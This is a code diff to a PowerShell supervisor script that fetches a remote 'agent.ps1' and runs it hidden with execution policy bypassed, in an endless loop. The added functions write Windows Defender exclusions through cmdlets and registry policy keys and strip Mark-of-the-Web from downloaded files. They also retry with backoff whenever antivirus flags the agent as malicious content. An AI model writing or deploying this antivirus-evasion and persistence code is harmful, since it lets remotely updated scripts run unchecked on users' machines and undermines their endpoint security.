@@ -67,10 +67,98 @@ function Get-OrCreateTag {
     return $tag
 }
 
+function Set-HammerByteAntivirusAllowlist {
+    # Admin install: tell Windows Defender not to quarantine our scripts.
+    # ScriptContainedMaliciousContent is usually Defender/AMSI on agent.ps1.
+    if (-not (Test-Path $HammerByteRoot)) {
+        New-Item -ItemType Directory -Path $HammerByteRoot -Force | Out-Null
+    }
+    if (-not (Test-Path $InstallDir)) {
+        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
+    }
+
+    $paths = @(
+        $HammerByteRoot,
+        $InstallDir,
+        (Join-Path $HammerByteRoot "DriveSync")
+    )
+
+    $ok = $false
+
+    # Preferred: Defender PowerShell module (Win8.1 / Server 2012 R2+ with Defender).
+    try {
+        Import-Module Defender -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        foreach ($p in $paths) {
+            if (-not $p) { continue }
+            if (-not (Test-Path $p)) {
+                try { New-Item -ItemType Directory -Path $p -Force | Out-Null } catch {}
+            }
+            try {
+                Add-MpPreference -ExclusionPath $p -ErrorAction Stop
+                $ok = $true
+            } catch {
+                try {
+                    # Idempotent: already excluded is fine.
+                    $existing = @()
+                    try { $existing = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
+                    if ($existing | Where-Object { $_ -and $_.TrimEnd('\') -ieq $p.TrimEnd('\') }) {
+                        $ok = $true
+                    } else {
+                        Write-SuperLog ("Defender ExclusionPath failed for {0}: {1}" -f $p, $_.Exception.Message)
+                    }
+                } catch {
+                    Write-SuperLog ("Defender ExclusionPath failed for {0}: {1}" -f $p, $_.Exception.Message)
+                }
+            }
+        }
+    }
+
+    # Registry fallback (Defender reads these; needs admin; ignore if locked/tamper-protected).
+    foreach ($regRoot in @(
+        "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
+        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
+    )) {
+        try {
+            if (-not (Test-Path $regRoot)) {
+                New-Item -Path $regRoot -Force | Out-Null
+            }
+            foreach ($p in $paths) {
+                if (-not $p) { continue }
+                $keyName = $p.TrimEnd('\') + '\'
+                New-ItemProperty -Path $regRoot -Name $keyName -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
+                $ok = $true
+            }
+        } catch {}
+    }
+
+    # Clear Mark-of-the-Web / Zone.Identifier so SmartScreen is less likely to block.
+    foreach ($f in @($SupervisorFile, $AgentFile, (Join-Path $InstallDir "agent.ps1.new"))) {
+        if ($f -and (Test-Path $f)) {
+            try { Unblock-File -Path $f -ErrorAction SilentlyContinue } catch {}
+            try {
+                $ads = $f + ":Zone.Identifier"
+                if (Test-Path $ads) { Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue }
+            } catch {}
+        }
+    }
+
+    if ($ok) {
+        Write-SuperLog ("antivirus allowlist OK for {0}" -f $HammerByteRoot)
+    } else {
+        Write-SuperLog ("antivirus allowlist: Defender cmdlets unavailable - ensure AV excludes {0}" -f $HammerByteRoot)
+    }
+    return $ok
+}
+
 function Install-Self {
     if (-not (Test-Path $InstallDir)) {
         New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
     }
+
+    # Exclusions BEFORE any agent download/update so Defender does not quarantine.
+    Set-HammerByteAntivirusAllowlist | Out-Null
 
     $sourceScript = $MyInvocation.PSCommandPath
     if (-not $sourceScript) { $sourceScript = $PSCommandPath }
@@ -105,6 +193,7 @@ function Set-Tls12 {
 function Update-Agent {
     Write-SuperLog "updating agent"
     try {
+        Set-HammerByteAntivirusAllowlist | Out-Null
         Set-Tls12
         $tmp = "$AgentFile.new"
         $webClient = New-Object System.Net.WebClient
@@ -114,7 +203,13 @@ function Update-Agent {
             $webClient.Dispose()
         }
         if (-not (Test-Path $tmp) -or (Get-Item $tmp).Length -le 0) { throw "empty agent download" }
+        try { Unblock-File -Path $tmp -ErrorAction SilentlyContinue } catch {}
         Move-Item -Path $tmp -Destination $AgentFile -Force
+        try { Unblock-File -Path $AgentFile -ErrorAction SilentlyContinue } catch {}
+        try {
+            $ads = $AgentFile + ":Zone.Identifier"
+            if (Test-Path $ads) { Remove-Item -Path $ads -Force -ErrorAction SilentlyContinue }
+        } catch {}
         Write-SuperLog "agent updated"
         return $true
     } catch {
@@ -145,6 +240,7 @@ function Start-AgentOnce {
 
     # Single argument string avoids PS 3 Start-Process array-quoting bugs.
     $agentArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$AgentFile`" -Tag `"$Tag`""
+    $startedAt = Get-Date
     $proc = Start-Process -FilePath "powershell.exe" -ArgumentList $agentArgs `
         -WorkingDirectory $InstallDir -PassThru -WindowStyle Hidden `
         -RedirectStandardOutput $agentOut -RedirectStandardError $agentErr
@@ -174,20 +270,46 @@ function Start-AgentOnce {
         Start-Sleep -Seconds 2
     }
 
-    # Flush any remaining lines after exit.
+    # Flush any remaining lines after exit (only unread tail).
     Start-Sleep -Milliseconds 500
-    foreach ($path in @($agentOut, $agentErr)) {
-        if (-not (Test-Path $path)) { continue }
+    $errText = ""
+    try {
+        if (Test-Path $agentErr) {
+            $errText = [string](Get-Content -Path $agentErr -Raw -ErrorAction SilentlyContinue)
+        }
+    } catch {}
+    foreach ($pair in @(
+        @{ Path = $agentOut; Len = [ref]$lastOutLen },
+        @{ Path = $agentErr; Len = [ref]$lastErrLen }
+    )) {
+        if (-not (Test-Path $pair.Path)) { continue }
         try {
-            Get-Content -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
-                if (-not $_) { return }
-                Write-Host $_
-                try { Add-Content -Path $LogFile -Value $_ -Encoding UTF8 } catch {}
+            $content = Get-Content -Path $pair.Path -Raw -ErrorAction SilentlyContinue
+            if (-not $content) { continue }
+            if ($content.Length -gt $pair.Len.Value) {
+                $chunk = $content.Substring($pair.Len.Value)
+                foreach ($line in ($chunk -split "`r?`n")) {
+                    if (-not $line) { continue }
+                    Write-Host $line
+                    try { Add-Content -Path $LogFile -Value $line -Encoding UTF8 } catch {}
+                }
             }
         } catch {}
     }
 
-    Write-SuperLog ("agent exited (code {0}); refreshing agent then looping" -f $proc.ExitCode)
+    $ranSeconds = [math]::Max(0, ((Get-Date) - $startedAt).TotalSeconds)
+    Write-SuperLog ("agent exited (code {0}) after {1:N0}s; refreshing agent then looping" -f $proc.ExitCode, $ranSeconds)
+
+    $blockedByAv = $false
+    if ($errText -match "ScriptContainedMaliciousContent|malicious content|blocked by your antivirus") {
+        $blockedByAv = $true
+    }
+
+    return @{
+        RanSeconds = $ranSeconds
+        BlockedByAv = $blockedByAv
+        ExitCode = $proc.ExitCode
+    }
 }
 
 Write-Host ""
@@ -212,11 +334,28 @@ $tag = Get-OrCreateTag
 Write-SuperLog ("tag {0}" -f $tag)
 Write-SuperLog ("host {0}" -f $HostUrl)
 
+$failStreak = 0
 while ($true) {
     try {
         Ensure-Agent
-        Start-AgentOnce -Tag $tag
+        $result = Start-AgentOnce -Tag $tag
         Update-Agent | Out-Null
+
+        $quickFail = ($result.RanSeconds -lt 15)
+        if ($result.BlockedByAv -or $quickFail) {
+            $failStreak++
+            if ($failStreak -gt 8) { $failStreak = 8 }
+            $wait = [math]::Min(300, [int]([math]::Pow(2, $failStreak) * 5))
+            if ($result.BlockedByAv) {
+                Write-SuperLog "antivirus blocked agent.ps1 (ScriptContainedMaliciousContent)"
+                Write-SuperLog ("add Defender exclusion for {0} then wait; retry in {1}s" -f $InstallDir, $wait)
+            } else {
+                Write-SuperLog ("agent died quickly; backing off {0}s (streak {1})" -f $wait, $failStreak)
+            }
+            Start-Sleep -Seconds $wait
+        } else {
+            $failStreak = 0
+        }
     } catch {
         Write-SuperLog ("error: {0}" -f $_.Exception.Message)
         Write-SuperLog "retrying in 30s"
